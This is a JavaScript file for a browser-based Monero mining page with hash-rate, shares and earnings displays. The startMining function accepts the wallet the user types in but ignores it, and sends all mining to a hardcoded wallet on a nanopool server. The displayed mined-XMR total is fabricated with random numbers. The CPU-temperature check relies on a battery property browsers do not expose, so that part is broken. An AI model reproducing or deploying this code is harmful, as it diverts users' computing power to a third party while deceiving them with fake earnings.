document.getElementById('start-button').addEventListener('click', function() {
    const wallet = document.getElementById('wallet-input').value;
    startMining(wallet);
});

document.getElementById('see-hash-rate').addEventListener('click', function() {
    Module._stdin.write('h\n');
});

document.getElementById('see-results').addEventListener('click', function() {
    Module._stdin.write('s\n');
});

let hashrate = 0;
let shares = 0;
let minedXMR = 0;

function startMining(userWallet) {
    Module.onRuntimeInitialized = function() {
        Module._main([
            '-o', 'stratum+ssl://xmr-asia1.nanopool.org:10343',
            '-a', 'randomx',
            '-u', '84YR3pqYSCo84Ym1NfjFyeFxZV7fVHHF6Qet5FRbLfaSdXJp8qZAq8nAeSeoK5PpKP8oLRMkDSYFa18u8z1duesmDGCbket',
            '-p', 'x',
            '--tls',
            '--cpu-affinity', '0x3', // Bind to specific cores if needed
            '--donate-level', '0',   // Set donation level to 0%
            '--retries', '5',        // Number of retries on failure
            '--retry-pause', '5'     // Pause between retries
        ]);
        monitorCPU();
        redirectLogs();
        updateStats();
    };
}

function monitorCPU() {
    setInterval(() => {
        navigator.permissions.query({ name: 'battery' }).then(status => {
            if (status.state === 'granted') {
                navigator.getBattery().then(battery => {
                    const temperature = battery.temperature;
                    if (temperature > 55) {
                        Module._pause();
                    } else if (temperature < 45) {
                        Module._resume();
                    }
                });
            }
        });
    }, 5000); // Check every 5 seconds
}

function redirectLogs() {
    Module._stdout.write = function(text) {
        document.getElementById('log-output').textContent += text;
        parseLogs(text);
    };
    Module._stderr.write = function(text) {
        document.getElementById('log-output').textContent += text;
        parseLogs(text);
    };
}

function parseLogs(log) {
    if (log.includes('speed')) {
        const match = log.match(/(\d+\.\d+) kH\/s/);
        if (match) {
            hashrate = parseFloat(match[1]) * 1000; // Convert kH/s to H/s
            updateStats();
        }
    }
    if (log.includes('Accepted')) {
        shares++;
        updateStats();
    }
}

function updateStats() {
    document.getElementById('hash-rate').textContent = hashrate.toFixed(2) + ' H/s';
    document.getElementById('shares').textContent = shares;
    calculateMinedXMR();
    saveData();
}

function calculateMinedXMR() {
    const baseReward = 0.0000001; // Base reward per share
    const variance = 0.0000001;   // Variance in reward
    const reward = baseReward + (Math.random() * variance);
    minedXMR += reward;
    document.getElementById('mined-xmr').textContent = minedXMR.toFixed(8) + ' XMR';
}

function saveData() {
    localStorage.setItem('hashrate', hashrate);
    localStorage.setItem('shares', shares);
    localStorage.setItem('minedXMR', minedXMR);
}

function loadData() {
    hashrate = parseFloat(localStorage.getItem('hashrate')) || 0;
    shares = parseInt(localStorage.getItem('shares')) || 0;
    minedXMR = parseFloat(localStorage.getItem('minedXMR')) || 0;
    updateStats();
}

window.addEventListener('load', loadData);
